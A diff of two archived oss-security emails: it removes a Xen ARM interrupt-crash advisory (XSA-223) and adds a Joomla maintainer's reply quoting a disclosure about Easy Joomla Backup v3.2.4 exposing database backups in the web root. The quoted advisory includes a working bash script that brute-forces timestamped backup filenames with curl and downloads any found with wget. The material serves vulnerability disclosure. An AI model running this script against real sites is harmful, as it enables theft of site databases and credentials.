@@ -1,107 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/07/10
-Message-Id: <E1dTTi7-000285-LU@xenbits.xenproject.org>
-Date: Fri, 07 Jul 2017 13:54:19 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 223 (CVE-2017-10919) - ARM guest disabling interrupt may crash Xen
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/28/4
+Message-ID: <etPan.59ccf477.771c0a21.6fc3@community.joomla.org>
+Date: Thu, 28 Sep 2017 15:09:11 +0200
+From: David Jardin <david.jardin@...munity.joomla.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+It’s worth to mention that the extension has a default .htaccess file with a „deny from all“ in the backup directory, that will mitigate the described attack on pretty much any standard shared-hosting platform that I’m aware of.
 
-            Xen Security Advisory CVE-2017-10919 / XSA-223
-                              version 3
 
-              ARM guest disabling interrupt may crash Xen
 
-UPDATES IN VERSION 3
-====================
 
-CVE assigned.
+Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@...com) schrieb:
 
-ISSUE DESCRIPTION
-=================
+Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure  
+Author: Larry W. Cashdollar, @_larry0  
+Date: 2017-09-07  
+CVE-ID:[CVE-2017-2550]  
+Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup  
+Vendor: kubik-rubik  
+Vendor Notified: 2017-09-07  
+Vendor Contact:  
+Advisory: http://www.vapidlabs.com/advisory.php?v=200  
+Description: Easy Joomla Backup creates 'old-school' backups without any frills.  
+Vulnerability:  
+The software creates a copy of the backup in the web root. The file name is easily guessable as it's just a time stamp:  
 
-Virtual interrupt injection could be triggered by a guest when sending
-an SGI (e.g IPI) to any vCPU or by configuring timers. When the virtual
-interrupt is masked, a missing check in the injection path may result in
-reading invalid hardware register or crashing the host.
+http://example.com/administrator/components/com_easyjoomlabackup/backups/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip  
 
-IMPACT
-======
+Exploit Code:  
+• #!/bin/bash  
+• #Larry W. Cashdollar, @_larry0 9/7/2017  
+• #Bruteforce download backups for Joomla Extension Easy Joomla Backup v3.2.4  
+• #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup  
+• MONTH=09  
+• DAY=07  
+• YEAR=2017  
+• Z=0  
+• #May need to set the DOMAIN to $1 the target depending on how WP is configured.  
+• DOMAIN=192.168.0.163  
+•  
+• echo "Scanning website for available backups:"  
+• for y in `seq -w 0 23`; do  
+• for x in `seq -w 0 59`; do  
+• Y=`echo "scale=2;($Z/86000)*100"|bc`;  
+• echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"  
+• for z in `seq -w 0 59`; do  
+• Z=$(( $Z + 1 ));  
+• CPATH="http://$1/administrator/components/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";  
+• RESULT=`curl -s --head $CPATH|grep 200`;  
+• if [ -n "$RESULT" ]; then  
+• echo ""  
+• echo "[+] Location $CPATH Found";  
+• echo "[+] Received $RESULT";  
+• echo "Downloading......";  
+• wget $CPATH  
+• fi;  
+• done  
+• done  
+• done  
+• echo "Completed."
+-- 
+Kind Regards,
+David Jardin
+Content of type "text/html" skipped
 
-A guest may cause a hypervisor crash, resulting in a Denial of Service
-(DoS).
-
-VULNERABLE SYSTEMS
-==================
-
-All Xen versions which support ARM are affected.
-
-x86 systems are not affected.
-
-MITIGATION
-==========
-
-On systems where the guest kernel is controlled by the host rather than
-guest administrator, running only kernels which do not disable SGI and
-PPI (i.e IRQ < 32) will prevent untrusted guest users from exploiting
-this issue. However untrusted guest administrators can still trigger it
-unless further steps are taken to prevent them from loading code into
-the kernel (e.g by disabling loadable modules etc) or from using other
-mechanisms which allow them to run code at kernel privilege.
-
-CREDITS
-=======
-
-This issue was discovered by Julien Grall of ARM.
-
-RESOLUTION
-==========
-
-Applying the attached patch resolves this issue.
-
-xsa223.patch           xen-unstable, Xen 4.8.x, Xen 4.7.x, Xen 4.6.x, Xen 4.5.x
-
-$ sha256sum xsa223*
-b5c8d8e8dac027069bec7dd812cff3f6f99e5949dd4a8ee729255c38274958b1  xsa223.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBCAAGBQJZX5I2AAoJEIP+FMlX6CvZuooH/0bkL0vO55m0gAFI/5Ipsopj
-tsvHObMSeeXRbn9IlhHgqG1HMtiMxMrT5ucQk66jW9oaEX4wxSbeZfDj7F0YlS7q
-krtRpQsxd0cwL5vN5aGSTs7e8O3G2pXUcVszp/lifZs/17QzjWZTPafQcthcAcRk
-ohX46fW8GROCXltHXI5epV7vxfD6JiKcejGNa/DUk65qPawjL/kcO2hrcGT8SS6f
-wlMNnR3ECwcMf0KYxvXrMyyLkfjKhQJDX3Ue6gRretBZ/llSRa75SWNWdGo3lQN1
-7y2OuNbr4b2LISZE4f+F0xwMpuBTSnBnrVbyYSyGbBLULsGQF9Di7ok4bqPsuGA=
-=TPUB
------END PGP SIGNATURE-----
-
-Download attachment "xsa223.patch" of type "application/octet-stream" (1999 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (875 bytes)
